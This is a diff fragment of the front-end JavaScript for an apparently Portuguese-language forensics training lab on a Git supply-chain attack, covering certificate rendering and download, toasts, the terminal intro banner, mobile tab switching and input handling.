+  bgGrad.addColorStop(0.5, '#fff8f0');
+  bgGrad.addColorStop(1, '#f0f8ff');
+  ctx.fillStyle = bgGrad;
+  ctx.fillRect(0, 0, W, H);
+
+  // Subtle grid
+  ctx.strokeStyle = 'rgba(0,0,0,0.04)';
+  ctx.lineWidth = 1;
+  for (let x = 0; x < W; x += 40) { ctx.beginPath(); ctx.moveTo(x,0); ctx.lineTo(x,H); ctx.stroke(); }
+  for (let y = 0; y < H; y += 40) { ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(W,y); ctx.stroke(); }
+
+  // Decorative border — triple frame
+  // Outer
+  ctx.strokeStyle = '#1a1e2e';
+  ctx.lineWidth = 3;
+  ctx.strokeRect(20, 20, W-40, H-40);
+  // Middle
+  ctx.strokeStyle = '#00cc6a';
+  ctx.lineWidth = 1.5;
+  ctx.strokeRect(28, 28, W-56, H-56);
+  // Inner thin
+  ctx.strokeStyle = 'rgba(0,204,106,0.4)';
+  ctx.lineWidth = 0.5;
+  ctx.strokeRect(34, 34, W-68, H-68);
+
+  // Corner ornaments
+  function drawCorner(x, y, sx, sy) {
+    ctx.save();
+    ctx.translate(x, y);
+    ctx.scale(sx, sy);
+    ctx.strokeStyle = '#1a1e2e';
+    ctx.lineWidth = 2;
+    // L-shape
+    ctx.beginPath();
+    ctx.moveTo(0, 30); ctx.lineTo(0, 0); ctx.lineTo(30, 0);
+    ctx.stroke();
+    // Dot
+    ctx.fillStyle = '#00cc6a';
+    ctx.beginPath();
+    ctx.arc(0, 0, 5, 0, Math.PI*2);
+    ctx.fill();
+    ctx.restore();
+  }
+  drawCorner(20, 20, 1, 1);
+  drawCorner(W-20, 20, -1, 1);
+  drawCorner(20, H-20, 1, -1);
+  drawCorner(W-20, H-20, -1, -1);
+
+  // Top section: logo badge
+  ctx.fillStyle = '#1a1e2e';
+  roundRect(ctx, W/2 - 80, 50, 160, 40, 8);
+  ctx.fillStyle = '#fff';
+  ctx.font = 'bold 14px monospace';
+  ctx.textAlign = 'center';
+  ctx.fillText('GIT FORENSICS LAB', W/2, 75);
+
+  // Badge glow line
+  const lineGrad = ctx.createLinearGradient(100, 0, W-100, 0);
+  lineGrad.addColorStop(0, 'transparent');
+  lineGrad.addColorStop(0.3, '#00cc6a');
+  lineGrad.addColorStop(0.7, '#00aacc');
+  lineGrad.addColorStop(1, 'transparent');
+  ctx.strokeStyle = lineGrad;
+  ctx.lineWidth = 2;
+  ctx.beginPath();
+  ctx.moveTo(100, 110); ctx.lineTo(W-100, 110);
+  ctx.stroke();
+
+  // "CERTIFICADO DE CONCLUSÃO"
+  ctx.fillStyle = '#2a3050';
+  ctx.font = 'bold 13px Arial';
+  ctx.letterSpacing = '4px';
+  ctx.textAlign = 'center';
+  ctx.fillText('C E R T I F I C A D O   D E   C O N C L U S Ã O', W/2, 145);
+
+  // Divider dots
+  ctx.fillStyle = '#00cc6a';
+  [-3,-2,-1,0,1,2,3].forEach((i) => {
+    ctx.beginPath();
+    ctx.arc(W/2 + i*16, 162, 3, 0, Math.PI*2);
+    ctx.fill();
+  });
+
+  // "Certificamos que"
+  ctx.fillStyle = '#6b7280';
+  ctx.font = '18px Georgia, serif';
+  ctx.textAlign = 'center';
+  ctx.fillText('Certificamos que', W/2, 200);
+
+  // NAME — big
+  const nameGrad = ctx.createLinearGradient(W/2 - 200, 0, W/2 + 200, 0);
+  nameGrad.addColorStop(0, '#00a855');
+  nameGrad.addColorStop(1, '#0088aa');
+  ctx.fillStyle = nameGrad;
+  ctx.font = 'bold 52px Georgia, serif';
+  ctx.textAlign = 'center';
+  ctx.fillText(name, W/2, 268);
+
+  // Underline name
+  const nameW = ctx.measureText(name).width;
+  const lineGrad2 = ctx.createLinearGradient(W/2 - nameW/2, 0, W/2 + nameW/2, 0);
+  lineGrad2.addColorStop(0, 'transparent');
+  lineGrad2.addColorStop(0.2, '#00cc6a');
+  lineGrad2.addColorStop(0.8, '#00aacc');
+  lineGrad2.addColorStop(1, 'transparent');
+  ctx.strokeStyle = lineGrad2;
+  ctx.lineWidth = 1.5;
+  ctx.beginPath();
+  ctx.moveTo(W/2 - nameW/2, 278);
+  ctx.lineTo(W/2 + nameW/2, 278);
+  ctx.stroke();
+
+  // "concluiu com êxito o laboratório"
+  ctx.fillStyle = '#374151';
+  ctx.font = '18px Georgia, serif';
+  ctx.textAlign = 'center';
+  ctx.fillText('concluiu com êxito o laboratório', W/2, 315);
+
+  // Course name — big em destaque
+  ctx.fillStyle = '#1a1e2e';
+  ctx.font = 'bold 30px Arial';
+  ctx.textAlign = 'center';
+  ctx.fillText('Git Forensics Lab: Supply Chain Attack', W/2, 368);
+
+  // Course subtitle
+  ctx.fillStyle = '#6b7280';
+  ctx.font = '15px Arial';
+  ctx.fillText('Investigação Forense de Repositórios Comprometidos', W/2, 395);
+
+  // Decorative separator
+  ctx.strokeStyle = '#e5e7eb';
+  ctx.lineWidth = 1;
+  ctx.beginPath();
+  ctx.moveTo(80, 420); ctx.lineTo(W-80, 420); ctx.stroke();
+
+  // Details grid: carga horária, data, score
+  const detailY = 460;
+  const cols = [220, W/2, W-220];
+  const labels = ['Carga Horária', 'Data de Conclusão', 'Modalidade'];
+  const values = ['4 horas', new Date().toLocaleDateString('pt-BR'), 'Online · Autoguiado'];
+
+  cols.forEach((cx, i) => {
+    // Box
+    ctx.fillStyle = 'rgba(0,0,0,0.03)';
+    roundRect(ctx, cx - 90, detailY - 30, 180, 70, 10);
+    ctx.fillStyle = '#9ca3af';
+    ctx.font = '11px Arial';
+    ctx.textAlign = 'center';
+    ctx.fillText(labels[i].toUpperCase(), cx, detailY - 10);
+    ctx.fillStyle = '#111827';
+    ctx.font = 'bold 16px Arial';
+    ctx.fillText(values[i], cx, detailY + 18);
+  });
+
+  // Badge icons
+  ctx.font = '22px Arial';
+  ctx.fillText('⏱', cols[0], detailY - 28);
+  ctx.fillText('📅', cols[1], detailY - 28);
+  ctx.fillText('💻', cols[2], detailY - 28);
+
+  // Separator
+  ctx.strokeStyle = '#e5e7eb';
+  ctx.lineWidth = 1;
+  ctx.beginPath();
+  ctx.moveTo(80, 555); ctx.lineTo(W-80, 555); ctx.stroke();
+
+  // Signature section
+  const sigY = 620;
+
+  // Left: seal decoration
+  ctx.save();
+  ctx.translate(170, sigY);
+  // Outer circle
+  ctx.beginPath();
+  ctx.arc(0, 0, 55, 0, Math.PI*2);
+  const sealGrad = ctx.createRadialGradient(0, 0, 10, 0, 0, 55);
+  sealGrad.addColorStop(0, 'rgba(0,204,106,0.15)');
+  sealGrad.addColorStop(1, 'rgba(0,204,106,0.05)');
+  ctx.fillStyle = sealGrad;
+  ctx.fill();
+  ctx.strokeStyle = '#00cc6a';
+  ctx.lineWidth = 2;
+  ctx.stroke();
+  // Inner circle
+  ctx.beginPath();
+  ctx.arc(0, 0, 42, 0, Math.PI*2);
+  ctx.strokeStyle = 'rgba(0,204,106,0.4)';
+  ctx.lineWidth = 1;
+  ctx.stroke();
+  // Checkmark
+  ctx.strokeStyle = '#00cc6a';
+  ctx.lineWidth = 4;
+  ctx.lineCap = 'round';
+  ctx.lineJoin = 'round';
+  ctx.beginPath();
+  ctx.moveTo(-18, 0);
+  ctx.lineTo(-5, 14);
+  ctx.lineTo(18, -14);
+  ctx.stroke();
+  ctx.restore();
+
+  // "APROVADO" text on seal
+  ctx.fillStyle = '#00a855';
+  ctx.font = 'bold 11px Arial';
+  ctx.textAlign = 'center';
+  ctx.fillText('APROVADO', 170, sigY + 26);
+
+  // Right: Instructor signature
+  const sigX = W - 220;
+  ctx.strokeStyle = '#1a1e2e';
+  ctx.lineWidth = 1;
+  ctx.beginPath();
+  ctx.moveTo(sigX - 120, sigY + 15); ctx.lineTo(sigX + 120, sigY + 15);
+  ctx.stroke();
+
+  // Decorative signature (handwritten-ish)
+  ctx.save();
+  ctx.translate(sigX, sigY - 10);
+  ctx.strokeStyle = '#1a1e2e';
+  ctx.lineWidth = 2;
+  ctx.lineCap = 'round';
+  ctx.lineJoin = 'round';
+  ctx.beginPath();
+  // "Mariana BS" stylized
+  ctx.moveTo(-60, 0);
+  ctx.bezierCurveTo(-40, -20, -20, 10, 0, 0);
+  ctx.bezierCurveTo(20, -10, 40, 15, 60, 0);
+  ctx.stroke();
+  ctx.restore();
+
+  ctx.fillStyle = '#111827';
+  ctx.font = 'bold 15px Arial';
+  ctx.textAlign = 'center';
+  ctx.fillText('Mariana BS', sigX, sigY + 35);
+  ctx.fillStyle = '#6b7280';
+  ctx.font = '12px Arial';
+  ctx.fillText('Instrutora · Git Forensics Lab', sigX, sigY + 53);
+
+  // Bottom watermark
+  ctx.fillStyle = 'rgba(0,0,0,0.12)';
+  ctx.font = '11px monospace';
+  ctx.textAlign = 'center';
+  ctx.fillText(`ID: GFL-${Date.now().toString(36).toUpperCase()} · Verificável em lab.forensics.example`, W/2, H - 45);
+
+  canvas.style.display = 'block';
+
+  // Auto-download
+  setTimeout(() => {
+    const link = document.createElement('a');
+    link.download = `certificado-git-forensics-${name.replace(/\s+/g,'-').toLowerCase()}.png`;
+    link.href = canvas.toDataURL('image/png');
+    link.click();
+    showToast('📥 Certificado baixado!', 'success');
+  }, 300);
+}
+
+function roundRect(ctx, x, y, w, h, r) {
+  ctx.beginPath();
+  ctx.moveTo(x+r, y);
+  ctx.lineTo(x+w-r, y);
+  ctx.quadraticCurveTo(x+w, y, x+w, y+r);
+  ctx.lineTo(x+w, y+h-r);
+  ctx.quadraticCurveTo(x+w, y+h, x+w-r, y+h);
+  ctx.lineTo(x+r, y+h);
+  ctx.quadraticCurveTo(x, y+h, x, y+h-r);
+  ctx.lineTo(x, y+r);
+  ctx.quadraticCurveTo(x, y, x+r, y);
+  ctx.closePath();
+  ctx.fill();
+}
+
+// ============================================================
+// TOAST
+// ============================================================
+let toastTimeout;
+function showToast(msg, type='success') {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = `toast visible toast-${type}`;
+  clearTimeout(toastTimeout);
+  toastTimeout = setTimeout(() => t.classList.remove('visible'), 3000);
+}
+
+// ============================================================
+// INIT
+// ============================================================
+function startLab() {
+  document.getElementById('intro-screen').style.display = 'none';
+  document.getElementById('main-app').style.display = 'block';
+
+  initTerminal();
+  focusInput();
+}
+
+function initTerminal() {
+  termOutput('╔══════════════════════════════════════════════════════╗', 'info');
+  termOutput('║     GIT FORENSICS LAB · INCIDENT RESPONSE v2.4      ║', 'info');
+  termOutput('║     Classificação: CRÍTICO | Repo: fintech-auth      ║', 'info');
+  termOutput('╚══════════════════════════════════════════════════════╝', 'info');
+  termOutput('');
+  termOutput('⚠  INCIDENTE DETECTADO: Comportamento anômalo no pipeline CI/CD', 'warning');
+  termOutput('   Exfiltração de secrets suspeita. Iniciar investigação forense.', 'warning');
+  termOutput('');
+  termOutput('Bem-vindo, analista. O repositório está disponível para inspeção.', 'dim');
+  termOutput('Use "help" para ver os comandos disponíveis.', 'dim');
+  termOutput('Use as dicas à direita ou clique nos chips de comandos.', 'dim');
+  termOutput('');
+  termOutput('Lembre-se: o ataque pode não ser óbvio. Há um falso positivo.', 'highlight');
+  termOutput('');
+}
+
+// ============================================================
+// MOBILE TAB SWITCHER
+// ============================================================
+function switchMobileTab(tab) {
+  const terminal = document.getElementById('terminal-panel');
+  const side = document.getElementById('side-panel');
+  const tabT = document.getElementById('tab-terminal');
+  const tabQ = document.getElementById('tab-questions');
+
+  if (tab === 'terminal') {
+    terminal.classList.add('mobile-active');
+    side.classList.remove('mobile-active');
+    tabT.classList.add('active');
+    tabQ.classList.remove('active');
+    focusInput();
+  } else {
+    side.classList.add('mobile-active');
+    terminal.classList.remove('mobile-active');
+    tabQ.classList.add('active');
+    tabT.classList.remove('active');
+  }
+}
+
+// Auto-switch to questions tab after running a command on mobile
+function isMobile() { return window.innerWidth <= 768; }
+
+function updateMobileTabBadge() {
+  const unanswered = QUESTIONS.filter((q, qi) =>
+    q.phase <= state.phase && !state.answers[qi]
+  ).length;
+  const tabQ = document.getElementById('tab-questions');
+  if (!tabQ) return;
+  const icon = unanswered > 0
+    ? `🔍<sup style="color:var(--yellow);font-size:9px;vertical-align:super">${unanswered}</sup>`
+    : '✅';
+  tabQ.querySelector('.mobile-tab-icon').innerHTML = icon;
+}
+
+function restartLab() {
+  localStorage.removeItem('gflab_state');
+  location.reload();
+}
+
+// ============================================================
+// INPUT HANDLING
+// ============================================================
+document.addEventListener('DOMContentLoaded', () => {
+  loadState();
+  initQuestions();
+
+  const input = document.getElementById('terminal-input');
+
+  input.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') {
+      const cmd = input.value;
+      input.value = '';
+      execCommand(cmd);
+    } else if (e.key === 'ArrowUp') {
+      e.preventDefault();
+      if (state.historyPos < state.history.length - 1) {
+        state.historyPos++;
+        input.value = state.history[state.history.length - 1 - state.historyPos] || '';
+      }
+    } else if (e.key === 'ArrowDown') {
+      e.preventDefault();
+      if (state.historyPos > 0) {
+        state.historyPos--;
+        input.value = state.history[state.history.length - 1 - state.historyPos] || '';
+      } else {
+        state.historyPos = -1;
+        input.value = '';
+      }
+    } else {
+      // type sound throttled
+      if (Math.random() < 0.3) playType();
+    }
+  });
+
+  // Handle saved state
+  if (state.finished) {
+    document.getElementById('intro-screen').style.display = 'none';
+    document.getElementById('main-app').style.display = 'block';
+    initTerminal();
+    renderPhase();
+    updateScore();
+    showResults();
+  } else if (state.totalAnswered > 0) {
+    // Mid-session restore
+    document.getElementById('intro-screen').style.display = 'none';
+    document.getElementById('main-app').style.display = 'block';
+    initTerminal();
+    termOutput('↩ Sessão anterior restaurada. Continuando investigação...', 'success');
+    termOutput('');
+    renderPhase();
+    updateScore();
+  } else {
+    renderPhase();
+    updateScore();
+  }
+});
+</script>
+</body>
+</html>
